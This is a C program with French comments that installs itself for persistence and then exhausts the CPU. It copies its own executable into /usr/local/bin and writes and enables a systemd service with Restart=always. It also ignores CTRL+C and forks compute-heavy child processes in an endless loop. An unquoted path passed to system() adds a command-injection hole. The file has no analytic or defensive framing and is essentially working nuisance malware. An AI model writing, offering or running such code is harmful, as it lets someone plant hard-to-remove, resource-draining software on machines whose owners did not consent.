#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <libgen.h>
#include <limits.h>
#include <string.h>

// Gestionnaire de signal pour ignorer CTRL+C
void signalHandler(int sig) {
    printf("CTRL+C détecté, mais ignoré\n");
}

// Fonction pour effectuer des calculs intensifs
void intensiveTask() {
    for (long i = 2; i < 1000000; i++) {
        int prime = 1;
        for (long j = 2; j < i; j++) {
            if (i % j == 0) {
                prime = 0;
                break;
            }
        }
    }
}

void createSystemdService(const char* execPath) {
    FILE *fp = fopen("/etc/systemd/system/monprogramme.service", "w");
    if (fp == NULL) {
        perror("Erreur en ouvrant le fichier de service");
        exit(EXIT_FAILURE);
    }

    fprintf(fp, "[Unit]\n");
    fprintf(fp, "Description=Mon Programme de Surcharge CPU\n\n");
    fprintf(fp, "[Service]\n");
    fprintf(fp, "ExecStart=%s\n", execPath);
    fprintf(fp, "Restart=always\n\n");
    fprintf(fp, "[Install]\n");
    fprintf(fp, "WantedBy=multi-user.target\n");

    fclose(fp);
    system("systemctl daemon-reload");
    system("systemctl enable monprogramme.service");
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signalHandler);

    // Détermine le chemin absolu de l'exécutable courant
    char execPath[PATH_MAX];
    realpath(argv[0], execPath);

    // Copie l'exécutable dans /usr/local/bin si nécessaire
    char* execName = basename(execPath);
    char newPath[PATH_MAX];
    snprintf(newPath, sizeof(newPath), "/usr/local/bin/%s", execName);

    char command[PATH_MAX * 2 + 10];
    snprintf(command, sizeof(command), "cp %s %s", execPath, newPath);
    system(command);

    // Crée un service systemd pour l'exécutable
    createSystemdService(newPath);

    while(1) {
        pid_t pid = fork();

        if (pid == 0) {
            // Processus enfant
            printf("Processus enfant avec PID: %d\n", getpid());
            intensiveTask();
            exit(0); // Termine le processus enfant
        } else if (pid > 0) {
            // Processus parent
            sleep(1); // Attendre une seconde avant de créer un autre processus
            wait(NULL); // Attendre la fin du processus enfant
        } else {
            // Échec du fork
            perror("Erreur de fork");
            exit(EXIT_FAILURE);
        }
    }

    return 0;
}
